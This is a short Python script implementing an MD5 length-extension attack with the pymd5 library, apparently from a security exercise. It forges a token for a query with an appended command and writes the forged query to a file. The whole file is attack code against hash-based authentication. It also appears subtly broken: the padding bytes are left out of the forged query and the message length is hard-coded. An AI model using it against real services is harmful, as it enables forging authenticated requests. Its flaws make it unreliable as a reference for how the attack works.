from pymd5 import md5, padding
import sys

def attack(m_hash, m_len, addition):
    count = m_len*8 + len(padding(m_len*8))*8
    return md5(addition, state=m_hash, count=count).hexdigest()


old_query = open(sys.argv[1]).read().strip()
new_command = open(sys.argv[2]).read().strip()

old_token = old_query[6:38]
print(old_token)
new_token = attack(old_token, 8, new_command)
new_query = "token=" + new_token + old_query[38:] + new_command

f = open(sys.argv[3], 'w')
f.write(new_query)
f.flush()
f.close()
